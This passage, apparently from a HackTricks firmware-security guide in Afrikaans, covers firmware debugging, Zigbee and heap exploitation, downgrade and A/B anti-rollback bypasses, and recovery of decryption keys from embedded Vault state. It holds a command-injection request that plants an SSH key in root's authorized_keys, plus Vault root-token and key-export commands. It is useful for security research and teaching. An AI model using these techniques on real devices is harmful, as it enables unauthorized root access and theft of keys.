Inspekteer volgehoue toestand buite die guest wanneer stadige selflaaie, vernietigende opstartskripte of onbetroubare konsole-aantekening die fout verdoesel. Moet nooit 'n overlay heg wat 'n lopende VM gebruik nie; stel dit bloot met `qemu-nbd`, beperk LVM-ontdekking tot die bedoelde NBD-partisie en deaktiveer die volumegroep voordat jy dit ontkoppel.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolering, skryf tydgestempelde merkerlêers na ’n stabiele skryfbare volume en verifieer dit vanlyn; `/dev/kmsg`, FIFO’s en tydelike konsoles kan vals negatiewe resultate oplewer weens tempobeperking of voortydige prosesbeëindiging. Vergelyk ook presiese koppelvlakke oor lae heen voordat onverwante kode verander word: `uname -r` teenoor `/lib/modules/`, ext4-kenmerke op skyf teenoor kernkonfigurasie, en die Mesa `libGL`-generasie teenoor DRI-drywer-ABI en PCI-afgeleide drywername. ’n Komponent kan bestaan en selfs suksesvol met `dlopen()` gelaai word, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[11]](#references)</sup>

## Dinamiese analise in die praktyk

Op hierdie stadium word ’n werklike of geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die OS en lêerstelsel te behou. Emulasie boots hardeware-interaksies moontlik nie perfek na nie, wat dit soms nodig maak om die emulasie te herbegin. Analise behoort die lêerstelsel weer te ondersoek, blootgestelde webblaaie en netwerkdienste uit te buit, en kwesbaarhede in die bootloader te verken. Firmware-integriteitstoetse is van kritieke belang om potensiële agterdeurkwesbaarhede te identifiseer.

## Tegnieke vir looptydanalise

Looptydanalise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing, met behulp van nutsmiddels soos gdb-multiarch, Frida en Ghidra om breekpunte te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige ontfouter, **kopieer ’n staties gekoppelde `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/radio-medeverwerker-boodskapkartering

Op IoT-hubs word die RF-stapel dikwels tussen ’n **radio-MCU** en ’n Linux-userland-proses verdeel. ’n Nuttige werkvloei is om die pad in kaart te bring:<sup>[[8]](#references)</sup>

1. **RF-raam** oor die lug
2. **Beheerderkant-ontleder** op die radio-MCU
3. **Reeks-/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **Toepassingsversender** in die hoofdemon
5. **Protokolspesifieke hanteerder / toestandsmasjien**

Hierdie argitektuur skep twee teikens vir omgekeerde analise in plaas van een. As die beheerder binêre radiokrame na ’n tekstuele protokol soos `Group,Command,arg1,arg2,...` omskakel, bepaal:

- Die **boodskapgroepe** en versendertabelle
- Watter boodskappe van die **netwerk** kan kom teenoor dié wat van die beheerder self kom
- Die presiese **vervaardigerspesifieke diskrimineerdervelde** (byvoorbeeld Zigbee `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter hanteerders slegs bereikbaar is tydens **commissioning**, ontdekking of aflaaifases vir firmware/modelle

Vir Zigbee, neem spesifiek paringsverkeer vas en kyk of die teiken steeds die verstek-**Link Key** `ZigBeeAlliance09` gebruik. Indien wel, kan afluistering van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-installasiekodes verminder hierdie blootstelling, so let op of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokolhanteerders en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’s** bereik met minder veldgetoetste validering.<sup>[[8]](#references)</sup>

Praktiese werkvloei:

- Ontleed die opdragversender om die **hanteerder wat slegs vir die vervaardiger bedoel is** te vind.
- Herwin die tabelle vir **FSM-toestand**, **gebeurtenis**, **kontrole**, **aksie** en **volgende toestand**.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, en herprobeer-/fouttakke wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter wettige protokoluitruilings nodig is om die daemon in die kwesbare toestand te plaas, eerder as om aan te neem dat die foutiewe hanteerder altyd bereikbaar is.

Vir tydsensitiewe protokolle kan pakketherhaling vanuit ’n Python-raamwerk te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op regte hardeware (byvoorbeeld ’n **nRF52840**) met ’n vervaardigervlak-stapel na te boots, sodat jy die korrekte **eindpunte**, **eienskappe** en commissioning-tydsberekening kan blootlê.

### Foutklas vir gefragmenteerde aflaaie in ingebedde daemons

’n Herhalende firmware-foutklas kom voor in **aflaaie van gefragmenteerde blobs/modelle/konfigurasies**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakketplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teenoor die **oorspronklike toegekende grootte** te kontroleer.

Dit laat ’n aanvaller toe om:

- ’n Eerste geldige fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein heap-toekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakketplaaslike grootte te stuur wat aan die nuwe kontroles voldoen, maar steeds die oorspronklik toegekende buffer oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blob-aflaaitoestand te plaas voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde daemons is die maklikste manier om heap-metadata-uitbuiting te aktiveer dikwels nie om “vir opruiming te wag” nie, maar om die **protokol se eie fouthantering af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **herprobeer-** of **fouttoestande** te dwing.
- Oorskry die herprobeerdrempel sodat die daemon die **konteks terugstel** en die beskadigde buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om primitiewe aan die toewyserkant te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** toewysers in ingebedde Linux, waar beskadiging van chunk-metadata unlink-/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te beskadig om die toewyser se deurloop na **vals chunks wat binne die oorloopbuffer geplaas is** te herlei, eerder as om werklike bin-wysers onmiddellik te beskadig en die proses te laat ineenstort.

## Binêre uitbuiting en Proof-of-Concept

Om ’n PoC vir geïdentifiseerde kwesbaarhede te ontwikkel, vereis ’n diepgaande begrip van die teikenargitektuur en programmering in laervlaktale. Binêre looptydbeskermings is skaars in ingebedde stelsels, maar wanneer dit voorkom, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc-fastbin-uitbuitingsaantekeninge (ingebedde Linux)

- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals chunk kontroles slaag (gesonde grootte, `fd = 0` en omliggende chunks wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binêre lêers onder ASLR:** as ASLR geaktiveer is, maar die hoofbinêre lêer **nie-PIE** is, is adresse in die binêre lêer se `.data/.bss` stabiel. Jy kan ’n gebied teiken wat reeds soos ’n geldige heap-chunk-kop lyk, om ’n fastbin-toekenning op ’n **funksiewysertabel** te laat beland.
- **NUL wat die ontleder laat stop:** wanneer JSON ontleed word, kan ’n `\x00` in die loonvrag die ontleding stop terwyl daaropvolgende aanvallerbeheerde grepe behoue bly vir ’n stapelaanskuif-/ROP-ketting.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende geheuekartering plaas en daarnaartoe spring.

## Voorbereide bedryfstelsels vir firmware-analise

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied voorafgekonfigureerde omgewings vir firmware-sekuriteitstoetsing, toegerus met die nodige nutsmiddels.

## Voorbereide bedryfstelsels om firmware te ontleed

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met sekuriteitsbeoordeling en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit bespaar baie tyd deur ’n voorafgekonfigureerde omgewing met al die nodige nutsmiddels te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met nutsmiddels vir firmware-sekuriteitstoetsing.

## Firmware-afgraderingsaanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **weergawe-terugrolbeskerming (afgraderingsbeskerming)** dikwels weggelaat. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geflits word, vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware met ’n steeds geldige handtekening** installeer en sodoende gelapte kwesbaarhede weer invoer.<sup>[[4]](#references)</sup>

Tipiese aanvalswerkvloei:

1. **Verkry ’n ouer, ondertekende beeld**
   * Kry dit vanaf die vervaardiger se openbare aflaaipoortaal, CDN of ondersteuningswerf.
   * Onttrek dit uit verwante mobiele/rekenaartoepassings (bv. binne ’n Android APK onder `assets/firmware/`).
   * Kry dit van derdeparty-bewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld op na die toestel, of bedien dit aan die toestel** via enige beskikbare opdateringskanaal:
   * Web-UI, mobieletoepassing-API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikers bied *ongeverifieerde* HTTP(S)-eindpunte wat Base64-geënkodeerde firmware-blobs aanvaar, dit aan die bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Nadat die firmware afgegradeer is, buit ’n kwesbaarheid uit wat in die nuwer weergawe reggestel is (byvoorbeeld ’n opdraginspuitingsfilter wat later bygevoeg is).
4. Flits opsioneel weer die nuutste beeld of deaktiveer opdaterings om opsporing te vermy nadat volharding verkry is.

### Voorbeeld: Command Injection ná afgradering

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk sonder sanitisering by ’n shell-opdrag gevoeg, wat inspuiting van arbitrêre opdragte moontlik maak (hier – om SSH-sleutelgebaseerde root-toegang te aktiveer). Latere firmwareweergawes het ’n basiese karakterfilter ingestel, maar die gebrek aan downgrade-beskerming maak die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Firmware uit mobiele toepassings onttrek

Baie verskaffers sluit volledige firmwarebeelde in hul metgesel-mobiele toepassings in sodat die toepassing die toestel oor Bluetooth/Wi-Fi kan opdateer. Hierdie pakkette word gewoonlik ongeënkripteer in die APK/APEX gestoor, onder paaie soos `assets/fw/` of `res/raw/`. Met nutsgoed soos `apktool`, `ghidra` of selfs gewone `unzip` kan jy getekende beelde onttrek sonder om aan die fisiese hardeware te raak.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Omseil van updater-only anti-rollback in A/B-slotontwerpe

Sommige verskaffers implementeer wel ’n anti-downgrade **ratchet**, maar net binne die *updater*-logika (byvoorbeeld ’n UDS-roetine oor CAN, ’n herstelopdrag of ’n userspace OTA-agent). As die **bootloader** later net die image-handtekening/CRC nagaan en die partisietabel of slotmetadata vertrou, kan rollback-beskerming steeds omseil word.<sup>[[7]](#references)</sup>

Tipiese swak ontwerp:

- Firmware-metadata bevat beide ’n weergawebeskrywer en ’n **security ratchet** / monotone teller.
- Die updater vergelyk die image-ratchet met ’n waarde wat in permanente berging gestoor is en verwerp ouer ondertekende images.
- Die bootloader **ontleed nie** daardie ratchet nie en verifieer net die opskrif, CRC en handtekening voordat dit die gekose slot selflaai.
- Slotaktivering word afsonderlik in ’n partisietabel of per-slot-generasieteller gestoor en is **nie kriptografies gekoppel** aan die presiese firmware-digest wat gevalideer is nie.

Dit skep ’n **valideer-een-image / selflaai-’n-ander-image**-primitief in dubbel-slotstelsels. As die aanvaller die updater sover kan kry om slot B as die volgende selflaaiteiken te merk met behulp van ’n huidige ondertekende image, en slot B later voor herbegin kan oorskryf, kan die bootloader steeds die afgegradeerde image selflaai omdat dit net die reeds vasgelegde slotmetadata vertrou.

Algemene misbruikpatroon:

1. Laai ’n **huidige ondertekende** firmware na die passiewe slot op en voer die gewone validerings-/skakelroetine uit sodat die uitleg daardie slot as die volgende aktiewe slot merk.
2. **Moenie nog herbegin nie**. Gaan in dieselfde sessie weer na die slotvoorbereidings-/uitroetine.
3. Misbruik verouderde selflaaitoestand- of slotkeuselogika sodat die updater die **dieselfde fisiese slot** uitvee wat pas bevorder is.
4. Skryf ’n **ouer maar steeds ondertekende** firmware na daardie slot.
5. Slaan die valideringsroetine wat die ratchet afdwing oor en herbegin direk.
6. Die bootloader kies die bevorderde slot, verifieer net die handtekening/integriteit en selflaai die ou image.

Dinge waarna jy moet kyk wanneer jy A/B-opdateringsimplementasies reverse-engineer:

- Slotkeuse wat afgelei word van **selflaaivlae** wat nie ná ’n suksesvolle oorskakeling verfris word nie.
- ’n `prepare_passive_slot()`-agtige roetine wat ’n slot uitvee op grond van verouderde toestand eerder as die **huidige vasgelegde uitleg**.
- ’n `part_write_layout()`-agtige funksie wat net ’n **generasieteller** / aktiewe vlag verhoog en nie die gevalideerde image-hash stoor nie.
- Ratchet-kontroles wat in userspace- of updater-kode geïmplementeer is, maar **nie** in die ROM-/bootloader-/secure-bootstadiums nie.
- Uitvee- of herstelroetines wat die slot as selflaaibaar gemerk laat, selfs nadat die inhoud daarvan verwyder en herskryf is.

### Kontrolelys vir die beoordeling van opdateringslogika

* Is die vervoer/waarmerking van die *update endpoint* voldoende beskerm (TLS + waarmerking)?
* Vergelyk die toestel **weergawenommers** of ’n **monotone anti-rollback-teller** voordat dit flits?
* Word die image binne ’n secure-boot-ketting geverifieer (bv. handtekeninge word deur ROM-kode nagegaan)?
* Dwing die **bootloader dieselfde ratchet** as die updater af, eerder as om net die handtekening/CRC na te gaan?
* Is slotaktiveringsmetadata **gekoppel aan die gevalideerde firmware-digest/-weergawe**, of kan ’n slot ná bevordering verander word?
* Word die toestel gedwing om te herbegin nadat ’n slotskakeling slaag, of is latere opdaterings-/uitroetines steeds in dieselfde sessie bereikbaar?
* Voer userland-kode bykomende gesonde-verstand-kontroles uit (bv. toegelate partisiekaart, modelnommer)?
* Hergebruik *gedeeltelike* of *rugsteun*-opdateringsvloeie dieselfde valideringslogika?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback-aanvalle.

## Kwesbare firmware om mee te oefen

Om kwesbaarhede in firmware te ontdek, gebruik die volgende kwesbare firmwareprojekte as ’n beginpunt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Herwinning van firmware-dekripsiesleutels uit ingebedde KMS/Vault-toestand

Wanneer ’n opdateringsimage klein metadata in gewone teks met ’n groot blob met hoë entropie meng, doen houer-triage voordat jy enigiets brute-force:<sup>[[1]](#references)</sup>

- Dump opskrifte, offsets en reëlgrense met `hexdump`, `xxd`, `strings -tx`, `base64 -d` en `binwalk -E`.
- `Salted__` beteken gewoonlik OpenSSL `enc`-formaat: die volgende 8 grepe is die salt en die oorblywende grepe is ciphertext.
- ’n Base64-veld wat na presies `256` grepe dekodeer, is ’n sterk aanduiding dat jy na ’n RSA-2048-ciphertext kyk wat ’n ewekansige firmware-wagwoord/sessiesleutel omsluit.
- Afgelope PGP-materiaal in dieselfde lêer beskerm dikwels net egtheid; moenie aanvaar dat dit die meganisme vir vertroulikheid is nie.

As statiese sleutelsoektogte (`grep`, `strings`, PEM/PGP-soektogte) misluk, reverse-engineer eerder die **operasionele dekripsiepad** as om net na private sleutels te soek:

- Dekompileer die updater-/bestuursbinêre lêer en volg wie die geënkripteerde blob lees, watter helper/API dit ontseël en watter logiese sleutelnaam dit aanvra.
- Soek in die onttrekte wortellêerstelsel vir KMS-toestand (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), sowel as eenheidslêers en init-skripte.
- Behandel gewone-teks `vault operator unseal ...`, herstelsleutels, bootstrap-tokens of plaaslike KMS-outo-ontseëlskripte as gelykstaande aan private-sleutelmateriaal.

As die toestel die oorspronklike Vault-binêre lêer en bergingbackend insluit, is dit gewoonlik makliker om daardie omgewing te herspeel as om Vault-internals te herimplementeer:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Met root op die gekloonde KMS:

- Maak transit-sleutels slegs binne die geïsoleerde kloon uitvoerbaar: `vault write transit/keys/<name>/config exportable=true`
- Voer die unwrap-sleutel uit: `vault read transit/export/encryption-key/<name>`
- Toets die herwonne RSA-sleutel met die presiese padding/hash-paar wat deur die KMS gebruik word. ’n Mislukte PKCS#1 v1.5-dekripsie en ’n mislukte verstek-OAEP-dekripsie bewys **nie** dat die sleutel verkeerd is nie; baie Vault-gesteunde vloei gebruik OAEP met SHA-256, terwyl algemene biblioteke SHA-1 as verstek gebruik.
- As die payload met `Salted__` begin, herhaal die verskaffer se OpenSSL KDF presies (`EVP_BytesToKey`, dikwels MD5 op ouer toestelle) voordat jy AES-CBC-dekripsie probeer.

Dit verander “geënkripteerde firmware” in ’n meer algemene probleem: **herwin die toestel se operasionele sleutels, en herhaal dan die presiese unwrap- en KDF-parameters vanlyn**.

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kraak firmware met Claude: Vaardigheid op seniorvlak, outonomie op juniorvlak](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologie vir firmware-sekuriteitstoetsing](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktiese IoT-inbraak: Die beslissende gids vir aanvalle op die Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Ontginning van zero-days in verlate hardeware – Trail of Bits-blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Hoe ’n slimtoestel van $20 my toegang tot jou huis gegee het](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Nou sien jy mi: Nou is jy Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Ontginning van die Tesla Wall Connector via sy laaipoortverbinding - Deel 2: omseiling van die anti-downgrade-beskerming](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Laat dit flikker: Ontginning van die Philips Hue Bridge oor die lug](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS op QEMU Deel 1: Uitpak](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-kerneldokumentasie - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS op QEMU Deel 2: Ontfouting en regstelling](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS-wagwoorde: Swak XOR-enkripsie maak herstel vanaf SPI-flitsgeheue moontlik (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Gereedskap vir die herstel van Dell BIOS-wagwoorde](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Herhaling van hardeware-inbraak, Deel 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
